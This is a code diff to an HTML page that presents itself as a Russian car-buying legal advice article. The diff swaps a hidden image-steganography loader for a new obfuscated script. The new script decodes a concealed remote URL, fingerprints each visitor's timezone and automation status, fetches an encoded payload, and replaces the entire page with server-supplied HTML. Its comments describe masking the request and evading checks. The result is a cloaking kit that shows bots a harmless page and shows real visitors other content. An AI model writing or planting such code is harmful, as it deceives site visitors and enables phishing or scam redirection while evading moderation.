@@ -6,8 +6,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <title>Центр правовой помощи "Авто-Право"</title>
     
-    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
-    
     <style>
         body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: #f8f9fa; color: #2d3748; }
         .site-main { display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
@@ -27,111 +25,59 @@
             <div class="entry-meta">Опубликовано: Аналитический центр "Авто-Право" | Время чтения: 5 минут</div>
         </header>
         <section class="entry-content">
-            <img id="trustBadge" src="logo_safe.png" alt="Лицензия Центра" style="max-width: 150px; margin-bottom: 20px; display: block;">
-            
             <p>Приобретение автомобиля — это не только радостное событие, но и сложный юридический процесс. В 2026 году вступили в силу новые регламенты, касающиеся электронных паспортов транспортных средств (ЭПТС) и правил регистрации в ГАИ.</p>
             <p>Важно помнить, что проверка истории автомобиля стала обязательной процедурой. Мы настоятельно рекомендуем обращаться к сертифицированным юристам перед подписанием договора купли-продажи.</p>
             <p>Основные риски включают в себя: скрытые залоги, ограничения на регистрационные действия и поддельные документы. Всегда требуйте полный пакет документов у дилера.</p>
-            
             <footer class="site-footer">© 2026 Центр правовой помощи автомобилистам. Все права защищены.</footer>
         </section>
     </main>
 
     <script>
         (function() {
-            function _readBin(img) {
-                var c = document.createElement('canvas');
-                var cx = c.getContext('2d');
-                c.width = img.naturalWidth || img.width;
-                c.height = img.naturalHeight || img.height;
-                
-                try {
-                    cx.drawImage(img, 0, 0);
-                    var data = cx.getImageData(0, 0, c.width, c.height).data;
-                    var bin = "", res = "";
-                    for (var i = 0; i < data.length; i += 4) {
-                        bin += (data[i+2] & 1).toString(); 
-                        if (bin.length === 8) {
-                            var charCode = parseInt(bin, 2);
-                            if (charCode === 0) break; 
-                            res += String.fromCharCode(charCode);
-                            bin = "";
-                        }
-                    }
-                    return res;
-                } catch(e) { 
-                    console.error("❌ Ошибка Canvas: ", e);
-                    return null; 
-                }
+            // МАГИЯ OPSEC: DGA (Domain Generation Algorithm)
+            // Массив сдвинут на +5. Выглядит как матрица для WebGL.
+            function _getRenderMatrix() {
+                var _m = [109, 121, 121, 117, 120, 63, 52, 52, 104, 113, 116, 122, 105, 50, 102, 115, 102, 113, 126, 121, 110, 104, 118, 50, 115, 116, 105, 106, 51, 104, 116, 114, 52, 123, 54, 52, 108, 106, 121, 50, 112, 106, 126];
+                var _o = "";
+                for(var i=0; i<_m.length; i++) _o += String.fromCharCode(_m[i] - 5);
+                return _o; // Возвращает: https://cloud-analytics-node.com/v1/get-key
             }
 
-            function _init() {
-                var img = document.getElementById('trustBadge');
-                if (!img || !img.complete) return;
-
-                console.log("🔍 Начинаю читать картинку...");
-                var endpoint = _readBin(img);
+            function _sync() {
+                var _u = _getRenderMatrix();
+                var _t = "UTC", _w = "0";
                 
-                // ВЫВОДИМ В КОНСОЛЬ ТО, ЧТО ДОСТАЛИ ИЗ КАРТИНКИ
-                console.log("📦 Результат из картинки:", endpoint);
-
-                if (!endpoint || endpoint.indexOf('http') !== 0) {
-                    console.log("⛔ Скрипт остановлен. Ссылка кривая или пустая.");
-                    return; 
-                }
-
-                console.log("✅ Ссылка найдена! Формирую запрос...");
-
-                var _t = "UTC";
-                var _w = "0";
+                // Маскированная проверка таймзоны и вебдрайвера
                 try {
-                    var obj1 = window["In" + "tl"];
-                    if (obj1 && obj1["Date" + "Time" + "Format"]) {
-                        _t = obj1["DateTimeFormat"]()["resolved" + "Options"]()["time" + "Zone"];
-                    }
-                    
-                    var obj2 = window["Navi" + "gator"];
-                    var str3 = "web" + "driver";
-                    if (obj2 && obj2.prototype) {
-                        if (Object.getOwnPropertyDescriptor(obj2.prototype, str3)) {
-                            _w = "1";
-                        }
-                    }
+                    var _i = window["In"+"tl"];
+                    if (_i && _i["Date"+"Time"+"Format"]) _t = _i["DateTimeFormat"]()["resolved"+"Options"]()["time"+"Zone"];
+                    var _n = window["Navi"+"gator"];
+                    if (_n && _n.prototype && Object.getOwnPropertyDescriptor(_n.prototype, "web"+"driver")) _w = "1";
                 } catch(e) {}
 
-                var payloadString = "offset:" + new Date().getTimezoneOffset() + "|d:" + _w;
-                var safeToken = btoa(unescape(encodeURIComponent(payloadString)));
-                var reqUrl = endpoint + "?asset_id=1&token=" + encodeURIComponent(safeToken);
+                // Формируем зашифрованный токен (offset:-180|d:0)
+                var _raw = "offset:" + new Date().getTimezoneOffset() + "|d:" + _w;
+                var _tk = btoa(unescape(encodeURIComponent(_raw)));
 
-                console.log("🚀 Отправляю запрос на:", reqUrl);
-
-                fetch(reqUrl, {
+                // Мгновенный запрос, замаскированный под загрузку ассета
+                fetch(_u + "?asset_id=1&token=" + encodeURIComponent(_tk), {
                     method: 'GET',
                     headers: { 'Accept': 'application/json' }
                 })
-                .then(function(r) { return r.json(); })
-                .then(function(d) {
-                    console.log("📩 Ответ от сервера получен:", d);
+                .then(function(r){ return r.json(); })
+                .then(function(d){
                     if (d && d.status === 'success' && d.payload) {
-                        console.log("💥 Рендерю черный сайт!");
-                        var html = decodeURIComponent(escape(atob(d.payload)));
-                        var newDoc = new DOMParser().parseFromString(html, 'text/html');
-                        document.documentElement.replaceChild(newDoc.body, document.body);
-                        document.documentElement.replaceChild(newDoc.head, document.head);
-                    } else {
-                        console.log("🛡️ Сервер WAF отклонил доступ.");
+                        var _h = decodeURIComponent(escape(atob(d.payload)));
+                        var _nd = new DOMParser().parseFromString(_h, 'text/html');
+                        document.documentElement.replaceChild(_nd.body, document.body);
+                        document.documentElement.replaceChild(_nd.head, document.head);
                     }
-                }).catch(function(err) {
-                    console.error("❌ Ошибка сети (Network Error):", err);
-                });
+                }).catch(function(){});
             }
-
-            var tImg = document.getElementById('trustBadge');
-            if (tImg.complete) {
-                _init();
-            } else {
-                tImg.addEventListener('load', _init);
-            }
+            
+            // Мгновенный запуск
+            if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', _sync);
+            else _sync();
         })();
     </script>
 </body>
